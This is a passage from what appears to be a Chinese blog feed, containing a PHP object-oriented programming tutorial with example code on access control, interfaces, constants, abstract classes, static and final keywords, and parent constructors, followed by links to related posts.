color="red"><strong>(2) 方法的访问控制</strong></font><br>类中的方法可以被定义为公有，私有或受保护。如果没有设置这些关键字，则该方法默认为公有。<br></font></p><p>示例代码：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token comment" spellcheck="true">/**  * Define MyClass  */</span> <span class="token keyword">class</span> <span class="token class-name">MyClass</span> <span class="token punctuation">{</span>     <span class="token comment" spellcheck="true">// 声明一个公有的构造函数</span>     <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token punctuation">}</span>     <span class="token comment" spellcheck="true">// 声明一个公有的方法</span>     <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">MyPublic</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token punctuation">}</span>     <span class="token comment" spellcheck="true">// 声明一个受保护的方法</span>     <span class="token keyword">protected</span> <span class="token keyword">function</span> <span class="token function">MyProtected</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token punctuation">}</span>     <span class="token comment" spellcheck="true">// 声明一个私有的方法</span>     <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function">MyPrivate</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token punctuation">}</span>     <span class="token comment" spellcheck="true">// 此方法为公有</span>     <span class="token keyword">function</span> <span class="token function">Foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span>     <span class="token punctuation">{</span>         <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">MyPublic</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">MyProtected</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">MyPrivate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span> <span class="token punctuation">}</span> <span class="token variable">$myclass</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MyClass</span><span class="token punctuation">;</span> <span class="token variable">$myclass</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">MyPublic</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 这行能被正常执行</span> <span class="token variable">$myclass</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">MyProtected</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 这行会产生一个致命错误</span> <span class="token variable">$myclass</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">MyPrivate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 这行会产生一个致命错误</span> <span class="token variable">$myclass</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">Foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 公有，受保护，私有都可以执行</span> <span class="token comment" spellcheck="true">/**  * Define MyClass2  */</span> <span class="token keyword">class</span> <span class="token class-name">MyClass2</span> <span class="token keyword">extends</span> <span class="token class-name">MyClass</span> <span class="token punctuation">{</span>     <span class="token comment" spellcheck="true">// 此方法为公有</span>     <span class="token keyword">function</span> <span class="token function">Foo2</span><span class="token punctuation">(</span><span class="token punctuation">)</span>     <span class="token punctuation">{</span>         <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">MyPublic</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">MyProtected</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">MyPrivate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 这行会产生一个致命错误</span>     <span class="token punctuation">}</span> <span class="token punctuation">}</span> <span class="token variable">$myclass2</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MyClass2</span><span class="token punctuation">;</span> <span class="token variable">$myclass2</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">MyPublic</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 这行能被正常执行</span> <span class="token variable">$myclass2</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">Foo2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 公有的和受保护的都可执行，但私有的不行</span> <span class="token keyword">class</span> <span class="token class-name">Bar</span> <span class="token punctuation">{</span>     <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>         <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">testPrivate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">testPublic</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span>     <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">testPublic</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>         <span class="token keyword">echo</span> <span class="token string">"Bar::testPublic\n"</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span>     <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function">testPrivate</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>         <span class="token keyword">echo</span> <span class="token string">"Bar::testPrivate\n"</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span> <span class="token punctuation">}</span> <span class="token keyword">class</span> <span class="token class-name">Foo</span> <span class="token keyword">extends</span> <span class="token class-name">Bar</span> <span class="token punctuation">{</span>     <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">testPublic</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>         <span class="token keyword">echo</span> <span class="token string">"Foo::testPublic\n"</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span>     <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function">testPrivate</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>         <span class="token keyword">echo</span> <span class="token string">"Foo::testPrivate\n"</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span> <span class="token punctuation">}</span> <span class="token variable">$myFoo</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$myFoo</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// Bar::testPrivate</span> <span class="token comment" spellcheck="true">// Foo::testPublic</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;<br><font face="Comic sans MS"><font color="red"><strong>6. 接口</strong></font><br>使用<font color="#00B2EE"><strong>接口（interface）</strong></font>，可以指定某个类必须实现哪些方法，但不需要定义这些方法的具体内容。<br>接口是通过 interface关键字来定义的，就像定义一个标准的类一样，但其中定义所有的方法都是空的。<br>接口中定义的所有方法都必须是公有，这是接口的特性。<br>要实现一个接口，使用 implements 操作符。类中必须实现接口中定义的所有方法，否则会报一个致命错误。类可以实现多个接口，用逗号来分隔多个接口的名称。<br></font> </p><p>示例代码：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token comment" spellcheck="true">// 声明一个'iTemplate'接口</span><span class="token keyword">interface</span> <span class="token class-name">iTemplate</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">setVariable</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$var</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">getHtml</span><span class="token punctuation">(</span><span class="token variable">$template</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// 实现接口</span><span class="token keyword">class</span> <span class="token class-name">Template</span> <span class="token keyword">implements</span> <span class="token class-name">iTemplate</span><span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token variable">$vars</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">setVariable</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$var</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">vars</span><span class="token punctuation">[</span><span class="token variable">$name</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$var</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">getHtml</span><span class="token punctuation">(</span><span class="token variable">$template</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">vars</span> <span class="token keyword">as</span> <span class="token variable">$name</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$template</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">'{'</span> <span class="token punctuation">.</span> <span class="token variable">$name</span> <span class="token punctuation">.</span> <span class="token string">'}'</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">,</span> <span class="token variable">$template</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token variable">$template</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;<br><font face="Comic sans MS"><font color="red"><strong>7. 常量</strong></font><br>可以把在类中始终保持不变的值定义为常量。在定义和使用常量的时候不需要使用<font color="#FF7F00"> $ </font>符号。<br>常量的值必须是一个定值，不能是变量，类属性，数学运算的结果或函数调用。<br>自 PHP 5.3.0 起，可以用一个变量来动态调用类。但该变量的值不能为关键字（如 self，parent 或 static）。<br></font> </p><p>示例代码：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token operator">&lt;</span>?php class MyClass <span class="token punctuation">{</span>     const constant <span class="token operator">=</span> <span class="token string">'常量值'</span><span class="token punctuation">;</span>     <span class="token keyword">function</span> showConstant<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>         <span class="token keyword">echo</span>  self::constant <span class="token keyword">.</span> <span class="token string">"&lt;br/>"</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span> <span class="token punctuation">}</span> <span class="token keyword">echo</span> MyClass::constant <span class="token keyword">.</span> <span class="token string">"&lt;br/>"</span><span class="token punctuation">;</span> <span class="token variable">$classname</span> <span class="token operator">=</span> <span class="token string">"MyClass"</span><span class="token punctuation">;</span> <span class="token keyword">echo</span> <span class="token variable">$classname</span>::constant <span class="token keyword">.</span> <span class="token string">"&lt;br/>"</span><span class="token punctuation">;</span> // 自 5.3.0 起 <span class="token variable">$class</span> <span class="token operator">=</span> new MyClass<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$class</span>-<span class="token operator">></span>showConstant<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">echo</span> <span class="token variable">$class</span>::constant <span class="token keyword">.</span> <span class="token string">"&lt;br/>"</span><span class="token punctuation">;</span> // 自 PHP 5.3.0 起?<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;<br><font face="Comic sans MS"><font color="red"><strong>8. 抽象类</strong></font><br>任何一个类，如果它里面至少有一个方法是被声明为抽象的，那么这个类就必须被声明为抽象的。<br>定义为抽象的类不能被实例化。<br>被定义为抽象的方法只是声明了其调用方式（参数），不能定义其具体的功能实现。<br>继承一个抽象类的时候，子类必须定义父类中的所有抽象方法；另外，这些方法的访问控制必须和父类中一样（或者更为宽松）。例如某个抽象方法被声明为受保护的，那么<br>子类中实现的方法就应该声明为受保护的或者公有的，而不能定义为私有的。此外方法的调用方式必须匹配，即类型和所需参数数量必须一致。例如，子类定义了一个可选参数，而父类抽象方法的声明里没有，则两者的声明并无冲突。<br></font> </p><p>示例代码：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">ConcreteClass1</span> <span class="token keyword">extends</span> <span class="token class-name">AbstractClass</span><span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token keyword">function</span> <span class="token function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token string">"ConcreteClass1"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">prefixValue</span><span class="token punctuation">(</span><span class="token variable">$prefix</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token string">"{$prefix}ConcreteClass1"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">ConcreteClass2</span> <span class="token keyword">extends</span> <span class="token class-name">AbstractClass</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token string">"ConcreteClass2"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">prefixValue</span><span class="token punctuation">(</span><span class="token variable">$prefix</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token string">"{$prefix}ConcreteClass2"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$class1</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ConcreteClass1</span><span class="token punctuation">;</span><span class="token variable">$class1</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">printOut</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$class1</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">prefixValue</span><span class="token punctuation">(</span><span class="token string">'FOO_'</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">"&lt;br/>"</span><span class="token punctuation">;</span><span class="token variable">$class2</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ConcreteClass2</span><span class="token punctuation">;</span><span class="token variable">$class2</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">printOut</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$class2</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">prefixValue</span><span class="token punctuation">(</span><span class="token string">'FOO_'</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">"&lt;br/>"</span><span class="token punctuation">;</span><span class="token delimiter">?></span>程序运行结果：ConcreteClass1FOO_ConcreteClass1ConcreteClass2FOO_ConcreteClass2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;<br><font face="Comic sans MS"><font color="red"><strong>9. Static 关键字</strong></font><br>声明类属性或方法为 static(静态)，就可以不实例化类而直接访问。<br>静态属性不能通过一个类已实例化的对象来访问（但静态方法可以）。<br>由于静态方法不需要通过对象即可调用，所以伪变量 $this 在静态方法中不可用。<br>静态属性不可以由对象通过 -&gt; 操作符来访问。<br>自 PHP 5.3.0 起，可以用一个变量来动态调用类。但该变量的值不能为关键字 self，parent 或 static。<br></font> </p><p>示例代码：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">Foo</span> <span class="token punctuation">{</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token variable">$my_static</span> <span class="token operator">=</span> <span class="token string">'foo'</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">staticValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">return</span> self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token variable">$my_static</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">print</span> Foo<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token variable">$my_static</span> <span class="token punctuation">.</span> <span class="token string">"&lt;br/>"</span><span class="token punctuation">;</span><span class="token variable">$foo</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">print</span> <span class="token variable">$foo</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">staticValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">"&lt;br/>"</span><span class="token punctuation">;</span><span class="token delimiter">?></span>程序运行结果：foofoo<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;<br><font face="Comic sans MS"><font color="red"><strong>10. Final 关键字</strong></font><br>PHP 5 新增了一个 final 关键字。如果父类中的方法被声明为 final，则子类无法覆盖该方法。如果一个类被声明为 final，则不能被继承。<br></font></p><p>代码示例：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token keyword">class</span> <span class="token class-name">BaseClass</span> <span class="token punctuation">{</span>     <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>         <span class="token keyword">echo</span> <span class="token string">"BaseClass::test() called"</span> <span class="token punctuation">.</span> <span class="token constant">PHP_EOL</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span>     <span class="token keyword">final</span> <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">moreTesting</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>         <span class="token keyword">echo</span> <span class="token string">"BaseClass::moreTesting() called"</span>  <span class="token punctuation">.</span> <span class="token constant">PHP_EOL</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span> <span class="token punctuation">}</span> <span class="token keyword">class</span> <span class="token class-name">ChildClass</span> <span class="token keyword">extends</span> <span class="token class-name">BaseClass</span> <span class="token punctuation">{</span>     <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">moreTesting</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>         <span class="token keyword">echo</span> <span class="token string">"ChildClass::moreTesting() called"</span>  <span class="token punctuation">.</span> <span class="token constant">PHP_EOL</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span> <span class="token punctuation">}</span> <span class="token comment" spellcheck="true">// 报错信息 Fatal error: Cannot override final method BaseClass::moreTesting()</span><span class="token delimiter">?></span>程序运行结果：Fatal error<span class="token punctuation">:</span>  Cannot override <span class="token keyword">final</span> method BaseClass<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">moreTesting</span><span class="token punctuation">(</span><span class="token punctuation">)</span> in D<span class="token punctuation">:</span>\<span class="token package">WWW<span class="token punctuation">\</span>Basis<span class="token punctuation">\</span>oop<span class="token punctuation">\</span>opp_9</span><span class="token punctuation">.</span>php on line <span class="token number">16</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;<br><font face="Comic sans MS"><font color="red"><strong>11.调用父类构造方法</strong></font><br>PHP 不会在子类的构造方法中自动的调用父类的构造方法。要执行父类的构造方法，需要在子类的构造方法中调用 parent::__construct()<br></font> </p><p>代码示例：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Content-type:text/html;charset=utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//设置编码</span> <span class="token keyword">class</span> <span class="token class-name">BaseClass</span> <span class="token punctuation">{</span>     <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>         <span class="token keyword">print</span> <span class="token string">"BaseClass 类中构造方法"</span> <span class="token punctuation">.</span> <span class="token string">"&lt;br/>"</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span> <span class="token punctuation">}</span> <span class="token keyword">class</span> <span class="token class-name">SubClass</span> <span class="token keyword">extends</span> <span class="token class-name">BaseClass</span> <span class="token punctuation">{</span>     <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>         <span class="token keyword">parent</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// 子类构造方法不能自动调用父类的构造方法</span>         <span class="token keyword">print</span> <span class="token string">"SubClass 类中构造方法"</span> <span class="token punctuation">.</span> <span class="token string">"&lt;br/>"</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span> <span class="token punctuation">}</span> <span class="token keyword">class</span> <span class="token class-name">OtherSubClass</span> <span class="token keyword">extends</span> <span class="token class-name">BaseClass</span> <span class="token punctuation">{</span>     <span class="token comment" spellcheck="true">// 继承 BaseClass 的构造方法</span> <span class="token punctuation">}</span> <span class="token comment" spellcheck="true">// 调用 BaseClass 构造方法</span> <span class="token variable">$obj</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BaseClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 调用 BaseClass、SubClass 构造方法</span> <span class="token variable">$obj</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SubClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 调用 BaseClass 构造方法</span> <span class="token variable">$obj</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">OtherSubClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span>程序运行结果：BaseClass 类中构造方法BaseClass 类中构造方法SubClass 类中构造方法BaseClass 类中构造方法<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;<br>&emsp;</p><h4 id="1-9-PHP-函数"><font color="#3CB371" face="Comic sans MS">1.9 PHP 函数</font><a href="post/PHP-1#1-9-PHP-函数"></a></h4><p><font face="Comic sans MS"><font color="#00B2EE"><strong>[<a href="https://directoree.github.io/post/PHP-function">参见本站博客：PHP-函数</a>]</strong></font><br></font></p><p>&emsp;<br>&emsp;</p><h3 id="二、-PHP-正则表达式"><font color="#FF6347" face="Comic sans MS">二、 PHP 正则表达式</font><a href="post/PHP-1#二、-PHP-正则表达式"></a></h3><p><font face="Comic sans MS"><font color="#00B2EE"><strong>[<a href="https://directoree.github.io/post/PHP-Regular-Expression">参见本站博客：PHP-正则表达式</a>]</strong></font><br></font></p><p>&emsp;<br>&emsp;</p><h3 id="三、-PHP-文件系统"><font color="#FF6347" face="Comic sans MS">三、 PHP 文件系统</font><a href="post/PHP-1#三、-PHP-文件系统"></a></h3><p><font face="Comic sans MS"><font color="#00B2EE"><strong>[<a href="https://directoree.github.io/post/PHP-FileSystem">参见本站博客：PHP-文件系统</a>]</strong></font><br></font></p><p>&emsp;<br>&emsp;</p><h3 id="四、-PHP-文件上传"><font color="#FF6347" face="Comic sans MS">四、 PHP 文件上传</font><a href="post/PHP-1#四、-PHP-文件上传"></a></h3><p><font face="Comic sans MS"><font color="#00B2EE"><strong>[<a href="https://directoree.github.io/post/PHP-Upload">参见本站博客：PHP-文件上传</a>]</strong></font><br></font></p><p>&emsp;<br>&emsp;</p><h3 id="五、-MySQL入门"><font color="#FF6347" face="Comic sans MS">五、 MySQL入门</font><a href="post/PHP-1#五、-MySQL入门"></a></h3><p><font face="Comic sans MS"><font color="#00B2EE"><strong>[<a href="https://directoree.github.io/post/MySQL-Primer">参见本站博客：MySQL入门</a>]</strong></font><br></font></p><p>&emsp;<br>&emsp;</p><h3 id="六、-PHP操作MySQL数据库"><font color="#FF6347" face="Comic sans MS">六、 PHP操作MySQL数据库</font><a href="post/PHP-1#六、-PHP操作MySQL数据库"></a></h3><p><font face="Comic sans MS"><font color="#00B2EE"><strong>[<a href="https://directoree.top/post/PHP-MySQL" target="_blank" rel="noopener">参见本站博客：PHP操作MySQL数据库</a>]</strong></font><br></font></p><p>&emsp;<br>&emsp;</p><h3 id="七、-PHP会话管理和控制"><font color="#FF6347" face="Comic sans MS">七、 PHP会话管理和控制</font><a href="post/PHP-1#七、-PHP会话管理和控制"></a></h3><p><font face="Comic sans MS"><font color="#00B2EE"><strong>[<a href="https://directoree.top/post/PHP-SessionManagement" target="_blank" rel="noopener">参见本站博客：PHP-会话管理和控制</a>]</strong></font><br></font></p>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP语言 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Wireshark简单介绍和数据包分析</title>
      <link href="/post/Wireshark-1/"/>
      <url>/post/Wireshark-1/</url>
      
